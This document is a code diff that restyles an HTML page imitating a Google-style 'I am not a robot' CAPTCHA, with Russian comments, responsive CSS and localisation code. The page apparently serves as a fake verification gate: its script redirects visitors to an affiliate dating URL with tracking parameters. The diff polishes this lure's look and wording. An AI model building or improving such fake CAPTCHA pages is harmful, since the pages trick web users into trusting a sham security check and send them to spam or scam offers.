@@ -18,26 +18,30 @@
             left: 50%;
             transform: translate(-50%, -50%);
             display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            gap: 10px;
+            flex-direction: row; /* Всё в одну строку */
+            align-items: center; /* Вертикальное выравнивание по центру */
+            gap: 10px; /* Отступ между элементами */
+            width: 90%; /* Ограничиваем ширину контейнера */
+            max-width: 600px; /* Максимальная ширина для больших экранов */
         }
         .captcha-container {
             display: flex;
+            flex-direction: row; /* Элементы внутри captcha в одну строку */
             align-items: center;
             justify-content: space-between;
-            width: 300px;
-            padding: 10px;
+            padding: 5px 10px; /* Уменьшаем padding для компактности */
             border: 1px solid #dfe1e5;
             border-radius: 4px;
             background-color: #fff;
+            flex: 1; /* Растягиваем контейнер, чтобы он занимал доступное место */
         }
         .captcha-left {
             display: flex;
             align-items: center;
+            gap: 5px; /* Уменьшаем отступ между чекбоксом и текстом */
         }
         .captcha-checkbox {
-            margin-right: 10px;
+            margin-right: 0; /* Убираем margin-right, используем gap */
             width: 20px;
             height: 20px;
             cursor: pointer;
@@ -47,7 +51,7 @@
             appearance: none;
             -webkit-appearance: none;
             -moz-appearance: none;
-            box-sizing: border-box; /* Гарантирует корректные размеры с учётом границ */
+            box-sizing: border-box;
         }
         .captcha-checkbox.loading {
             border: none;
@@ -87,53 +91,112 @@
             }
         }
         .captcha-text {
-            font-size: 14px;
+            font-size: calc(0.9vw + 6px); /* Адаптивный размер шрифта */
             color: #000;
+            white-space: nowrap; /* Предотвращаем перенос текста */
         }
         .captcha-right {
             display: flex;
-            flex-direction: column;
-            align-items: flex-end;
+            flex-direction: row; /* Логотип и ссылки в одну строку */
+            align-items: center;
+            gap: 5px; /* Отступ между логотипом и текстом */
         }
         .captcha-logo {
-            width: 20px;
-            height: 20px;
-            margin-bottom: 5px;
+            width: 16px; /* Уменьшаем логотип для компактности */
+            height: 16px;
         }
         .captcha-brand {
-            font-size: 12px;
+            font-size: calc(0.7vw + 4px); /* Адаптивный размер шрифта */
             color: #757575;
+            white-space: nowrap;
         }
         .captcha-links {
-            font-size: 10px;
+            font-size: calc(0.6vw + 3px); /* Адаптивный размер шрифта */
             color: #757575;
+            white-space: nowrap;
         }
         .captcha-links a {
             color: #757575;
             text-decoration: none;
         }
         .submit-button {
-            padding: 8px 16px;
+            padding: 5px 10px; /* Уменьшаем padding для компактности */
             background-color: #f1f3f4;
             border: 1px solid #dadce0;
             border-radius: 4px;
-            font-size: 14px;
+            font-size: calc(0.8vw + 5px); /* Адаптивный размер шрифта */
             color: #202124;
             cursor: pointer;
+            white-space: nowrap;
+            font-weight: 500;
         }
         .submit-button:hover {
             background-color: #e8eaed;
         }
-        .button-container {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-        }
         .error {
             color: red;
-            font-size: 12px;
+            font-size: calc(0.6vw + 3px); /* Адаптивный размер шрифта */
             display: none;
-            margin-top: 5px;
+            position: absolute;
+            bottom: -20px; /* Размещаем ошибку под контейнером */
+            left: 0;
+            white-space: nowrap;
+        }
+
+        /* Медиа-запросы для корректировки шрифтов на маленьких экранах */
+        @media (max-width: 600px) {
+            .captcha-text {
+                font-size: 12px; /* Минимальный размер шрифта */
+            }
+            .captcha-brand {
+                font-size: 10px;
+            }
+            .captcha-links {
+                font-size: 8px;
+            }
+            .submit-button {
+                font-size: 11px;
+                padding: 4px 8px;
+            }
+            .error {
+                font-size: 8px;
+                bottom: -15px;
+            }
+            .captcha-logo {
+                width: 14px;
+                height: 14px;
+            }
+            .captcha-checkbox {
+                width: 16px;
+                height: 16px;
+            }
+            .captcha-checkbox.loading::before,
+            .captcha-checkbox.completed::before {
+                width: 16px;
+                height: 16px;
+            }
+            .captcha-checkbox.completed::before {
+                content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="green" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
+            }
+        }
+
+        /* Ограничение максимального размера шрифта на больших экранах */
+        @media (min-width: 1200px) {
+            .captcha-text {
+                font-size: 16px; /* Максимальный размер шрифта */
+            }
+            .captcha-brand {
+                font-size: 12px;
+            }
+            .captcha-links {
+                font-size: 10px;
+            }
+            .submit-button {
+                font-size: 14px;
+            }
+            .error {
+                font-size: 10px;
+            }
         }
     </style>
 </head>
@@ -155,7 +218,7 @@
             </div>
         </div>
         <div class="button-container">
-            <button class="submit-button" id="submit-button">Отправить</button>
+            <button class="submit-button" id="submit-button">Подтвердить</button>
             <div class="error" id="error">Пожалуйста, подтвердите, что вы не робот.</div>
         </div>
     </div>
@@ -196,6 +259,9 @@
     document.getElementById('error').textContent = translation.error;
     document.getElementById('privacy-link').textContent = translation.privacy;
     document.getElementById('terms-link').textContent = translation.terms;
+
+    // Меняем lang атрибут HTML на язык браузера
+    document.documentElement.lang = selectedLang;
 
     // Ссылка для редиректа
     const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';
